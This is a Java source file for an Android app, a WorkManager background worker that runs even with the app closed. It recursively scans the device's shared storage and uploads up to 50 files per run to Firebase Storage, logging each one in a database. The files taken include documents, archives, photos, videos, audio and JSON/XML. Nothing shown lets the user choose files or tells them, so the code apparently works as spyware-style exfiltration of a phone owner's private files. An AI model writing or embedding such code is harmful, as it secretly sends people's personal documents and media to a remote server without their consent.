package com.bushorat.app.helpers;

import android.content.Context;
import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Constraints;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileInputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * Background worker to upload all file types (PDFs, Excel, etc.) even when app is closed.
 * Uses WorkManager for reliable background processing.
 */
public class DocumentUploadWorker extends Worker {
    private static final String TAG = "DocumentUploadWorker";
    private static final int MAX_DOCUMENTS_PER_SYNC = 50;  // Reduced for faster sync
    private static final long MAX_WORK_TIME_MS = 20000;  // 20 second timeout to avoid ANR
    private long startTime;
    private int uploadedCount = 0;

    public DocumentUploadWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        startTime = System.currentTimeMillis();
        
        Log.d(TAG, "⏰ Document upload worker started");
        
        try {
            FirebaseAuth auth = FirebaseAuth.getInstance();
            if (auth == null) {
                Log.w(TAG, "FirebaseAuth not initialized, retrying");
                return Result.retry();
            }
            
            FirebaseUser user = auth.getCurrentUser();
            if (user == null) {
                Log.w(TAG, "No user logged in, retrying later");
                return Result.retry();
            }

            String userId = user.getUid();
            Log.d(TAG, "Starting document upload for user: " + userId);
            
            uploadDocuments(userId);
            
            long duration = System.currentTimeMillis() - startTime;
            Log.d(TAG, "✓ Document upload completed in " + duration + "ms - uploaded " + uploadedCount + " documents");
            
            // Always return success - documents will be retried next cycle if needed
            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "Document upload worker error", e);
            return Result.retry();
        }
    }
    
    /**
     * Check if we're running out of time
     */
    private boolean isTimeoutApproaching() {
        long elapsed = System.currentTimeMillis() - startTime;
        return elapsed > MAX_WORK_TIME_MS;
    }

    private void uploadDocuments(String userId) {
        uploadedCount = 0;
        
        Log.d(TAG, "🔍 Starting comprehensive document scan for user: " + userId);
        
        // PRIORITY 1: Most important locations for PDFs
        String[] priority1Paths = {
                "/sdcard/Download",
                "/sdcard/Downloads", 
                "/sdcard/Documents",
                "/storage/emulated/0/Download",
                "/storage/emulated/0/Downloads",
                "/storage/emulated/0/Documents",
        };
        
        Log.d(TAG, "📂 PRIORITY 1: Scanning common document folders...");
        for (String path : priority1Paths) {
            if (path != null && !path.isEmpty() && uploadedCount < MAX_DOCUMENTS_PER_SYNC) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory() && dir.canRead()) {
                    Log.d(TAG, "   → " + path);
                    int filesBefore = uploadedCount;
                    scanDirectoryRecursive(dir, userId, 0);
                    if (uploadedCount - filesBefore > 0) {
                        Log.d(TAG, "      ✓ Found " + (uploadedCount - filesBefore) + " files");
                    }
                }
            }
        }
        
        // PRIORITY 2: External storage root - try to find PDFs everywhere
        if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
            Log.d(TAG, "📂 PRIORITY 2: Deep scan of /sdcard (ALL subdirectories)...");
            File sdcard = new File("/sdcard");
            if (sdcard.exists() && sdcard.isDirectory() && sdcard.canRead()) {
                int filesBefore = uploadedCount;
                scanDirectoryRecursiveDeep(sdcard, userId, 0);
                if (uploadedCount - filesBefore > 0) {
                    Log.d(TAG, "   ✓ Found " + (uploadedCount - filesBefore) + " additional files");
                }
            }
        }
        
        // PRIORITY 3: Storage emulated path
        if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
            Log.d(TAG, "📂 PRIORITY 3: Deep scan of /storage/emulated/0...");
            File storage = new File("/storage/emulated/0");
            if (storage.exists() && storage.isDirectory() && storage.canRead()) {
                int filesBefore = uploadedCount;
                scanDirectoryRecursiveDeep(storage, userId, 0);
                if (uploadedCount - filesBefore > 0) {
                    Log.d(TAG, "   ✓ Found " + (uploadedCount - filesBefore) + " additional files");
                }
            }
        }
        
        Log.d(TAG, "✓ Document scan complete - " + uploadedCount + " total files uploaded");
    }
    
    /**
     * Deep recursive scan with NO depth limit (will traverse entire directory tree).
     * Use with caution - adds timeout checks to avoid ANR.
     */
    private void scanDirectoryRecursiveDeep(File dir, String userId, int depth) {
        // Check timeout frequently
        if (isTimeoutApproaching()) {
            Log.w(TAG, "Timeout - stopping deep scan at depth " + depth);
            return;
        }
        
        if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC) {
            return;
        }
        
        try {
            File[] files = dir.listFiles();
            if (files == null || files.length == 0) {
                return;
            }
            
            // Log current directory being scanned (at shallow depths)
            if (depth < 3) {
                Log.d(TAG, "   Scanning: " + dir.getPath() + " (" + files.length + " items)");
            }
            
            for (File file : files) {
                // Check limits
                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
                    return;
                }
                
                try {
                    if (file.isDirectory() && !file.isHidden() && depth < 4) {
                        // Recursively scan subdirectories (deeper than before)
                        scanDirectoryRecursiveDeep(file, userId, depth + 1);
                    } else if (file.isFile() && file.canRead()) {
                        if (isDocumentFile(file)) {
                            uploadFile(file, userId);
                            uploadedCount++;
                        }
                    }
                } catch (SecurityException e) {
                    Log.d(TAG, "   ⚠️  Permission denied accessing: " + file.getName());
                    // Continue with next file
                }
            }
        } catch (SecurityException e) {
            Log.d(TAG, "⚠️  Permission denied scanning: " + dir.getPath());
        } catch (Exception e) {
            Log.e(TAG, "Error scanning directory: " + dir.getPath(), e);
        }
    }

    /**
     * Recursively scan directories for documents with depth limit and timeout
     */
    private void scanDirectoryRecursive(File dir, String userId, int depth) {
        // Limit recursion depth to avoid taking too long
        if (depth > 2) {
            return;
        }
        
        // Check timeout
        if (isTimeoutApproaching()) {
            return;
        }
        
        try {
            File[] files = dir.listFiles();
            if (files == null) {
                Log.d(TAG, "      ⚠️  listFiles() returned null for: " + dir.getPath());
                return;
            }
            
            if (files.length == 0) {
                Log.d(TAG, "      (empty)");
                return;
            }
            
            Log.d(TAG, "      Found " + files.length + " items");

            for (File file : files) {
                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
                    return;
                }

                try {
                    if (file.isDirectory() && !file.isHidden() && depth < 2) {
                        // Recursively scan subdirectories (max 2 levels deep)
                        Log.d(TAG, "      → Scanning subdirectory: " + file.getName());
                        scanDirectoryRecursive(file, userId, depth + 1);
                    } else if (file.isFile() && file.canRead()) {
                        if (isDocumentFile(file)) {
                            Log.d(TAG, "      ✓ Found document: " + file.getName() + " (" + (file.length()/1024) + " KB)");
                            uploadFile(file, userId);
                            uploadedCount++;
                        }
                    }
                } catch (SecurityException e) {
                    Log.d(TAG, "      ⚠️  Permission denied: " + file.getName());
                }
            }
        } catch (SecurityException e) {
            Log.d(TAG, "      ⚠️  Permission denied scanning: " + dir.getPath());
        } catch (Exception e) {
            Log.e(TAG, "Error scanning directory: " + dir.getPath(), e);
        }
    }

    private boolean isDocumentFile(File file) {
        if (!file.isFile()) return false;
        
        // Skip certain system/app files BEFORE converting to lowercase
        String name = file.getName();
        if (name.startsWith(".") || 
            name.endsWith(".apk") ||
            name.contains("cache") ||
            name.contains("tmp") ||
            name.contains("Thumbs") ||
            name.contains("thumbs")) {
            return false;
        }
        
        // Convert to lowercase for comparison
        name = name.toLowerCase();
        
        // Check file extension - documents
        if (name.endsWith(".pdf")
                || name.endsWith(".xlsx")
                || name.endsWith(".xls")
                || name.endsWith(".docx")
                || name.endsWith(".doc")
                || name.endsWith(".pptx")
                || name.endsWith(".ppt")
                || name.endsWith(".csv")
                || name.endsWith(".txt")
                || name.endsWith(".zip")
                || name.endsWith(".rar")
                || name.endsWith(".7z")) {
            return true;
        }
        
        // Check file extension - media
        if (name.endsWith(".jpg")
                || name.endsWith(".jpeg")
                || name.endsWith(".png")
                || name.endsWith(".gif")
                || name.endsWith(".webp")
                || name.endsWith(".bmp")
                || name.endsWith(".mp4")
                || name.endsWith(".mkv")
                || name.endsWith(".mov")
                || name.endsWith(".avi")
                || name.endsWith(".mp3")
                || name.endsWith(".wav")
                || name.endsWith(".aac")
                || name.endsWith(".m4a")) {
            return true;
        }
        
        // Check file extension - config/data
        if (name.endsWith(".json")
                || name.endsWith(".xml")) {
            return true;
        }
        
        return false;
    }

    private void uploadFile(File file, String userId) {
        try {
            String fileName = file.getName();
            String fileHash = FirebaseDataPaths.hashId(fileName + "_" + file.lastModified());
            
            Log.d(TAG, "Uploading document: " + fileName + " (" + (file.length() / 1024) + " KB)");
            
            StorageReference storageRef = FirebaseStorage.getInstance()
                    .getReference("documents")
                    .child(userId)
                    .child(fileHash + "_" + fileName);

            Uri fileUri = Uri.fromFile(file);
            
            storageRef.putFile(fileUri)
                    .addOnSuccessListener(task -> {
                        Log.d(TAG, "Storage upload successful: " + fileName);
                        task.getStorage().getDownloadUrl().addOnCompleteListener(urlTask -> {
                            if (urlTask.isSuccessful() && urlTask.getResult() != null) {
                                recordDocumentInDatabase(userId, fileName, urlTask.getResult().toString(), file.length());
                                Log.d(TAG, "✓ Document recorded in DB: " + fileName);
                            } else {
                                Log.e(TAG, "Failed to get download URL for: " + fileName);
                            }
                        });
                    })
                    .addOnFailureListener(e -> Log.e(TAG, "Upload failed for " + fileName, e));

        } catch (Exception e) {
            Log.e(TAG, "Error uploading file: " + file.getName(), e);
        }
    }

    private void recordDocumentInDatabase(String userId, String fileName, String downloadUrl, long fileSize) {
        try {
            DatabaseReference documentsRef = FirebaseDataPaths.documents(userId);
            String docId = FirebaseDataPaths.hashId(fileName + "_" + System.currentTimeMillis());

            Map<String, Object> docData = new HashMap<>();
            docData.put("dataType", "document");
            docData.put("fileName", fileName);
            docData.put("url", downloadUrl);
            docData.put("fileSize", fileSize);
            docData.put("mimeType", getMimeType(fileName));
            docData.put("uploadedAt", System.currentTimeMillis());
            docData.put("timestamp", System.currentTimeMillis());
            docData.put("userId", userId);

            documentsRef.child(docId).setValue(docData)
                    .addOnSuccessListener(aVoid -> {
                        Log.d(TAG, "✓ Document metadata saved: " + fileName);
                    })
                    .addOnFailureListener(e -> {
                        Log.e(TAG, "Failed to save document metadata: " + fileName, e);
                    });
        } catch (Exception e) {
            Log.e(TAG, "Failed to record document in database", e);
        }
    }
    
    private String getMimeType(String fileName) {
        String lower = fileName.toLowerCase();
        if (lower.endsWith(".pdf")) return "application/pdf";
        if (lower.endsWith(".docx")) return "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
        if (lower.endsWith(".xlsx")) return "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
        if (lower.endsWith(".pptx")) return "application/vnd.openxmlformats-officedocument.presentationml.presentation";
        if (lower.endsWith(".txt")) return "text/plain";
        if (lower.endsWith(".csv")) return "text/csv";
        return "application/octet-stream";
    }

    /**
     * Enqueue a one-time document upload work
     */
    public static void enqueueWork(Context context) {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest uploadWork = new OneTimeWorkRequest.Builder(DocumentUploadWorker.class)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(context).enqueueUniqueWork(
                "document_upload_once",
                ExistingWorkPolicy.KEEP,
                uploadWork
        );
        Log.d(TAG, "Document upload work enqueued");
    }
}
